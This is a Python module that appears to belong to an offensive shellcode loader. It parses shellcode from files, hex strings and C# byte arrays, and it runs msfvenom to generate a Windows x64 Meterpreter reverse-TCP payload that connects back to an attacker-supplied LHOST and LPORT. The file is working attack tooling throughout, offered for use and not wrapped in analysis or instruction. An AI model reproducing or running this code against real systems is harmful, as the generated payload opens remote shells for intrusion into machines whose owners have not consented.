import re
import subprocess
import sys
from pathlib import Path


def from_file(path):
    p = Path(path)
    if not p.exists():
        print(f'[!] file not found: {path}', file=sys.stderr)
        sys.exit(1)
    sc = p.read_bytes()
    if len(sc) == 0:
        print(f'[!] empty file: {path}', file=sys.stderr)
        sys.exit(1)
    return sc


def from_hex(s):
    """Parse hex string: 'fc4883e4f0' or '\\xfc\\x48\\x83' or '0xfc 0x48'."""
    clean = s.strip()
    clean = clean.replace('\\x', '').replace('0x', '').replace(',', '')
    clean = clean.replace(' ', '').replace('\n', '').replace('\r', '')
    return bytes.fromhex(clean)


def from_csharp(text):
    """Parse C# byte array: 0xfc,0x48,0x83,...  or { 0xfc, 0x48 }"""
    vals = re.findall(r'0x[0-9a-fA-F]{1,2}', text)
    if not vals:
        print('[!] no bytes found in csharp input', file=sys.stderr)
        sys.exit(1)
    return bytes(int(v, 16) for v in vals)


def from_msfvenom(lhost, lport, payload='windows/x64/meterpreter/reverse_tcp',
                   exitfunc='thread'):
    """Generate raw shellcode via msfvenom subprocess."""
    cmd = [
        'msfvenom', '-p', payload,
        f'LHOST={lhost}', f'LPORT={lport}',
        f'EXITFUNC={exitfunc}',
        '-f', 'raw', '--quiet'
    ]
    print(f'[*] generating shellcode: {payload} -> {lhost}:{lport}', file=sys.stderr)
    # FIXME: msfvenom on WSL2 hangs without X forwarding -- add env check
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=30)
    except FileNotFoundError:
        print('[!] msfvenom not found -- is metasploit installed?', file=sys.stderr)
        sys.exit(1)
    except subprocess.TimeoutExpired:
        print('[!] msfvenom timed out', file=sys.stderr)
        sys.exit(1)

    if r.returncode != 0:
        print(f'[!] msfvenom failed: {r.stderr.decode().strip()}', file=sys.stderr)
        sys.exit(1)

    sc = r.stdout
    if len(sc) == 0:
        print('[!] msfvenom produced empty output', file=sys.stderr)
        sys.exit(1)

    print(f'[+] got {len(sc)} bytes of shellcode', file=sys.stderr)
    return sc
